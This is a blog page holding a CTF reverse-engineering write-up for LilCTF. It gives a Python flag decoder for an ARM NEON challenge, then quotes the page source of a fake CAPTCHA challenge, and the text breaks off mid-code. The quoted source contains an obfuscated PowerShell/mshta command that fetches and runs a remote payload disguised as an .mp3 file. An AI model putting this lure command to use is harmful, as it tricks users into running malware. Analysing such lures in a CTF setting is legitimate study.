@@ -1,0 +1,1148 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="w1n9">
+    
+    <!-- Completely eliminate flash of wrong theme -->
+    <script>
+        (function() {
+            const THEME_KEY = "REDEFINE-THEME-STATUS";
+            const DARK = "dark", LIGHT = "light";
+            
+            // Get preferred theme
+            function getTheme() {
+                try {
+                    const saved = localStorage.getItem(THEME_KEY);
+                    if (saved) {
+                        const { isDark } = JSON.parse(saved);
+                        return isDark ? DARK : LIGHT;
+                    }
+                } catch (e) {}
+                
+                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
+            }
+            
+            // Apply theme to document
+            function applyTheme(theme) {
+                const isDark = theme === DARK;
+                const root = document.documentElement;
+                
+                // Set data attribute for CSS variables
+                root.setAttribute("data-theme", theme);
+                
+                // Set classes for compatibility
+                root.classList.add(theme);
+                root.classList.remove(isDark ? LIGHT : DARK);
+                root.style.colorScheme = theme;
+            }
+            
+            // Initial application
+            const theme = getTheme();
+            applyTheme(theme);
+            
+            // Listen for system preference changes
+            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
+                // Only update if using system preference (no localStorage entry)
+                if (!localStorage.getItem(THEME_KEY)) {
+                    applyTheme(matches ? DARK : LIGHT);
+                }
+            });
+            
+            // Set body classes once DOM is ready
+            if (document.readyState !== "loading") {
+                document.body.classList.add(theme + "-mode");
+            } else {
+                document.addEventListener("DOMContentLoaded", () => {
+                    document.body.classList.add(theme + "-mode");
+                    document.body.classList.remove((theme === DARK ? LIGHT : DARK) + "-mode");
+                });
+            }
+        })();
+    </script>
+    
+    <!-- Critical CSS to prevent flash -->
+    <style>
+        :root[data-theme="dark"] {
+            --background-color: #202124;
+            --background-color-transparent: rgba(32, 33, 36, 0.6);
+            --second-background-color: #2d2e32;
+            --third-background-color: #34353a;
+            --third-background-color-transparent: rgba(32, 33, 36, 0.6);
+            --primary-color: #0066CC;
+            --first-text-color: #ffffff;
+            --second-text-color: #eeeeee;
+            --third-text-color: #bebec6;
+            --fourth-text-color: #999999;
+            --default-text-color: #bebec6;
+            --invert-text-color: #373D3F;
+            --border-color: rgba(255, 255, 255, 0.08);
+            --selection-color: #0066CC;
+            --shadow-color-1: rgba(255, 255, 255, 0.08);
+            --shadow-color-2: rgba(255, 255, 255, 0.05);
+        }
+        
+        :root[data-theme="light"] {
+            --background-color: #fff;
+            --background-color-transparent: rgba(255, 255, 255, 0.6);
+            --second-background-color: #f8f8f8;
+            --third-background-color: #f2f2f2;
+            --third-background-color-transparent: rgba(241, 241, 241, 0.6);
+            --primary-color: #0066CC;
+            --first-text-color: #16171a;
+            --second-text-color: #2f3037;
+            --third-text-color: #5e5e5e;
+            --fourth-text-color: #eeeeee;
+            --default-text-color: #373D3F;
+            --invert-text-color: #bebec6;
+            --border-color: rgba(0, 0, 0, 0.08);
+            --selection-color: #0066CC;
+            --shadow-color-1: rgba(0, 0, 0, 0.08);
+            --shadow-color-2: rgba(0, 0, 0, 0.05);
+        }
+        
+        body {
+            background-color: var(--background-color);
+            color: var(--default-text-color);
+        }
+        
+        /* Apply body classes as soon as DOM is ready */
+        :root[data-theme="dark"] body {
+            background-color: var(--background-color);
+            color: var(--default-text-color);
+        }
+    </style>
+    
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2025/08/21/lilctf rewp+复现/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+    
+        
+        <meta name="description" content="Hexo Theme Redefine, Redefine My Life.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="LilCTF REwp+复现">
+<meta property="og:url" content="http://example.com/2025/08/21/LilCTF%20REwp+%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Hexo Theme Redefine, Redefine My Life.">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/redefine-og.webp">
+<meta property="article:published_time" content="2025-08-21T03:18:35.000Z">
+<meta property="article:modified_time" content="2025-08-24T15:21:35.802Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="RE">
+<meta property="article:tag" content="比赛WP&#x2F;复现">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/redefine-og.webp">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="https://w1n9-1365782357.cos.ap-chengdu.myqcloud.com/204051836-d495c6a9-db6b-40df-b8be-ff0f2a82862e.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="https://w1n9-1365782357.cos.ap-chengdu.myqcloud.com/204051836-d495c6a9-db6b-40df-b8be-ff0f2a82862e.png">
+    <meta name="theme-color" content="#1890ff">
+    <link rel="shortcut icon" href="https://w1n9-1365782357.cos.ap-chengdu.myqcloud.com/204051836-d495c6a9-db6b-40df-b8be-ff0f2a82862e.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            LilCTF REwp+复现 | w1n9のHOME
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+        <link href="" rel="stylesheet">
+    
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"zh-CN"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#1890ff","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":true,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":true},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine My Life."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"w1n9のHOME","subtitle":{"text":[],"hitokoto":{"enable":true,"show_author":true,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.8.4","navbar":{"auto_hide":false,"color":{"left":"#af6bcc","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"分类":{"path":"/categories/","icon":"fa-regular fa-folder"},"标签":{"path":"/tags/","icon":"fa-regular fa-tags"},"友链":{"path":"/links","icon":"fa-regular fa-link"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":{"标签":{"path":"/tags","icon":"fa-regular fa-tags"},"分类":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3},"分类":{"enable":true,"limit":8},"标签":{"enable":true,"limit":10}},"footerStart":"2025/7/10 8:00:00"};
+    window.lang_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+
+<body>
+	<div class="progress-bar-container">
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                w1n9のHOME
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    首页
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/categories/"
+                                        >
+                                    <i class="fa-regular fa-folder fa-fw"></i>
+                                    分类
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/tags/"
+                                        >
+                                    <i class="fa-regular fa-tags fa-fw"></i>
+                                    标签
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/links"
+                                        >
+                                    <i class="fa-regular fa-link fa-fw"></i>
+                                    友链
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
+                    </div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                首页
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/categories/"
+                        >
+                            <span>
+                                分类
+                            </span>
+                            
+                                <i class="fa-regular fa-folder fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/tags/"
+                        >
+                            <span>
+                                标签
+                            </span>
+                            
+                                <i class="fa-regular fa-tags fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/links"
+                        >
+                            <span>
+                                友链
+                            </span>
+                            
+                                <i class="fa-regular fa-link fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+                
+                    
+                    
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">3</div>
+        <div class="label text-third-text-color text-sm">标签</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">2</div>
+        <div class="label text-third-text-color text-sm">分类</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">4</div>
+        <div class="label text-third-text-color text-sm">文章</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">LilCTF REwp+复现</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+				<img src="https://w1n9-1365782357.cos.ap-chengdu.myqcloud.com/b_577a9b6ec958b5976fe7bfc38f6b3c05.jpg">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">w1n9</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv1</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-08-21 11:18:35</span>
+        <span class="mobile">2025-08-21 11:18:35</span>
+        <span class="hover-info">创建</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-08-24 23:21:35</span>
+            <span class="mobile">2025-08-24 23:21:35</span>
+            <span class="hover-info">更新</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/CTF/">CTF</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/RE/">RE</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/%E6%AF%94%E8%B5%9BWP-%E5%A4%8D%E7%8E%B0/">比赛WP/复现</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<h2 id="ARM-ASM"><a href="#ARM-ASM" class="headerlink" title="ARM_ASM"></a>ARM_ASM</h2><p>这是主要的逻辑</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://w1n9-1365782357.cos.ap-chengdu.myqcloud.com/image-20250822112547927.png"
+                      alt="image-20250822112547927"
+                ></p>
+<p>加密函数为check，解包得到so文件用ida查看</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://w1n9-1365782357.cos.ap-chengdu.myqcloud.com/image-20250822112640797.png"
+                      alt="image-20250822112640797"
+                ></p>
+<p>加密逻辑为：Neon指令 → 位运算 → base64，这里的base64是变表</p>
+<p>exp如下：</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">VARIANT_B64_CHARS = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ3456780129+/&quot;</span></span><br><span class="line">VARIANT_B64_MAP = &#123;c: i <span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(VARIANT_B64_CHARS)&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">variant_b64_decode</span>(<span class="params">data: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    data = data.rstrip(<span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">    decoded_indices = [VARIANT_B64_MAP[c] <span class="keyword">for</span> c <span class="keyword">in</span> data]</span><br><span class="line">    </span><br><span class="line">    output_bytes = <span class="built_in">bytearray</span>()</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(decoded_indices):</span><br><span class="line">        b1 = decoded_indices[i]</span><br><span class="line">        b2 = decoded_indices[i+<span class="number">1</span>]</span><br><span class="line">        </span><br><span class="line">        output_bytes.append((b1 &lt;&lt; <span class="number">2</span>) | (b2 &gt;&gt; <span class="number">4</span>))</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> i + <span class="number">2</span> &lt; <span class="built_in">len</span>(decoded_indices):</span><br><span class="line">            b3 = decoded_indices[i+<span class="number">2</span>]</span><br><span class="line">            output_bytes.append(((b2 &amp; <span class="number">0x0F</span>) &lt;&lt; <span class="number">4</span>) | (b3 &gt;&gt; <span class="number">2</span>))</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> i + <span class="number">3</span> &lt; <span class="built_in">len</span>(decoded_indices):</span><br><span class="line">            b4 = decoded_indices[i+<span class="number">3</span>]</span><br><span class="line">            output_bytes.append(((b3 &amp; <span class="number">0x03</span>) &lt;&lt; <span class="number">6</span>) | b4)</span><br><span class="line">        </span><br><span class="line">        i += <span class="number">4</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(output_bytes)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_bit_shift</span>(<span class="params">data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(data) % <span class="number">3</span> != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line">        </span><br><span class="line">    result = <span class="built_in">bytearray</span>(<span class="built_in">len</span>(data))</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(data), <span class="number">3</span>):</span><br><span class="line">        byte0 = data[j]</span><br><span class="line">        byte1 = data[j+<span class="number">1</span>]</span><br><span class="line">        byte2 = data[j+<span class="number">2</span>]</span><br><span class="line">        </span><br><span class="line">        result[j] = ((byte0 &lt;&lt; <span class="number">5</span>) &amp; <span class="number">0xFF</span>) | (byte0 &gt;&gt; <span class="number">3</span>)</span><br><span class="line">        result[j+<span class="number">1</span>] = ((byte1 &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xFF</span>) | (byte1 &gt;&gt; <span class="number">7</span>)</span><br><span class="line">        result[j+<span class="number">2</span>] = byte2</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_neon_xor</span>(<span class="params">data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    t_initial = <span class="built_in">bytes</span>([<span class="number">0x0D</span>, <span class="number">0x0E</span>, <span class="number">0x0F</span>, <span class="number">0x0C</span>, <span class="number">0x0B</span>, <span class="number">0x0A</span>, <span class="number">0x09</span>, <span class="number">0x08</span>, <span class="number">0x06</span>, <span class="number">0x07</span>, <span class="number">0x05</span>, <span class="number">0x04</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x01</span>, <span class="number">0x00</span>])</span><br><span class="line">    </span><br><span class="line">    result = <span class="built_in">bytearray</span>()</span><br><span class="line">    v10 = <span class="built_in">bytearray</span>(t_initial)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        final_block = data[i*<span class="number">16</span> : (i+<span class="number">1</span>)*<span class="number">16</span>]</span><br><span class="line">        </span><br><span class="line">        intermediate_block = <span class="built_in">bytes</span>([a ^ b <span class="keyword">for</span> a, b <span class="keyword">in</span> <span class="built_in">zip</span>(final_block, v10)])</span><br><span class="line">        </span><br><span class="line">        original_block = <span class="built_in">bytearray</span>(<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">            lookup_index = v10[j] </span><br><span class="line">            <span class="keyword">if</span> lookup_index &lt; <span class="number">16</span>:</span><br><span class="line">                original_block[lookup_index] = intermediate_block[j]</span><br><span class="line">        </span><br><span class="line">        result.extend(original_block)</span><br><span class="line">       </span><br><span class="line">        v5 = <span class="built_in">bytes</span>([i] * <span class="number">16</span>)</span><br><span class="line">        v10 = <span class="built_in">bytes</span>([a ^ b <span class="keyword">for</span> a, b <span class="keyword">in</span> <span class="built_in">zip</span>(v10, v5)])</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    ciphertext = <span class="string">&quot;KRD2c1XRSJL9e0fqCIbiyJrHW1bu0ZnTYJvYw1DM2RzPK1XIQJnN2ZfRMY4So09S&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        decoded_data = variant_b64_decode(ciphertext)</span><br><span class="line">        </span><br><span class="line">        shifted_data = reverse_bit_shift(decoded_data)</span><br><span class="line">        </span><br><span class="line">        final_result_bytes = reverse_neon_xor(shifted_data)</span><br><span class="line"></span><br><span class="line">        flag_content = final_result_bytes.decode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(flag_content)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;解密过程中发生错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="comment"># LILCTF&#123;ez_arm_asm_meow_meow_meow_meow_meow_meow&#125;</span></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="1’M-no7-A-rO6oT"><a href="#1’M-no7-A-rO6oT" class="headerlink" title="1’M no7 A rO6oT"></a>1’M no7 A rO6oT</h2><p>这是页面部分源代码</p>
+<div class="code-container" data-rel="Jsx"><figure class="iseeu highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> cmd =</span><br><span class="line">      <span class="string">&quot;powershell . \\\\*i*\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\*2\\\\msh*e ###HOST###/Coloringoutomic_Host.mp3   ###HOST###/Coloringoutomic_Host.mp3 #     ✅ Ι am nοt a rοbοt: CAPTCHA Verification ID: 10086&quot;</span>;</span><br><span class="line">      <span class="keyword">const</span> baseUrl = <span class="string">`<span class="subst">$&#123;<span class="variable language_">window</span>.location.protocol&#125;</span>//<span class="subst">$&#123;<span class="variable language_">window</span>.location.host&#125;</span>`</span>;</span><br><span class="line"></span><br><span class="line">      <span class="title function_">fetch</span>(<span class="string">&quot;/whereami&quot;</span>, &#123;</span><br><span class="line">        <span class="attr">method</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">        <span class="attr">body</span>: baseUrl,</span><br><span class="line">      &#125;).<span class="title function_">catch</span>(<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;Failed to report host:&quot;</span>, err);</span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">function</span> <span class="title function_">showVerification</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> checkbox = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span 